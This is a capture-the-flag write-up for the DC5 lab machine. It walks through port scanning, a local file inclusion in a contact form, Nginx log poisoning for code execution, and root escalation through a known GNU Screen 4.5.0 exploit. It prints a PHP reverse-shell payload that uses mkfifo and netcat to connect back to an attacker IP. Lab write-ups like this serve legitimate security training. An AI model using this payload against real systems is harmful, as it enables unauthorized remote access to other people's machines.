# DC5 Offensive Security Community Writeup
## Level: Intermediate

![logo](1.png)

## Scanning
We launch **nmap** with scripts and software versions on all ports.

![](2.png)

## Enumeration

We access the website, review the source code and the different sections, but there is nothing interesting.

![](3.png)

We reviewed the site again, specifically the *"Contact"* section. There we find a contact form, we fill it with arbitrary data and we see that it is sent by GET method.

![](4.png)

If we reload the file without specifying the variable, we see that the copyright year is different, so it is very likely that the application is embedding files through variables (LFI?, Path traversal?).

![](5.png)

We launch the **Wfuzz** tool with a medium dictionary, enumerate a new variable.

![](6.png)

Yes, it is vulnerable to local file inclusion (LFI).

![](7.png)

Previously, we saw in the headers that the server has an **Nginx** deployed, so we load the configuration file and get the paths where it stores logs.

![](9.png)

## Exploitation
Perfect, now we will do some tests to know the file that could help us to execute malicious code.

#### Testing Remote Code Execute (RCE)
![](10.png)

#### Result testing Remote Code Execute (RCE)
![](11.png)

Great, having clear in which file we can evidence code execution, let's make a proof of concept that allows us to execute remote system commands.

#### PoC Log Poisoning + RCE
![](12.png)

#### Result PoC Log Poisoning + RCE
![](13.png)

Perfect! Well, we are not going to complicate and we are going to execute directly a reverse shell, but remember to put a **netcat** on the listen in our Kali.

We read the flag of *user.txt*.

#### Payload
```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.204 443 >/tmp/f');?>

```
#### Request with reverse shell code
![](14.png)

#### Result reverse shell code
![](15.png)

## Privilege Escalation
We ran some of our favorite recognition scripts (Ex. linpeas.sh) and listed a "**Screen**" in version 4.5.0.

![](16.png)

This binary has a known exploit that would allow us to escalate root privileges: [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

In my case, I compiled the necessary files and hosted them on the victim. Once downloaded, I executed the following two commands to escalate privileges to root and read the proof.txt file.
![](17.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='50' align='center'> [@David_Uton](https://twitter.com/David_Uton)
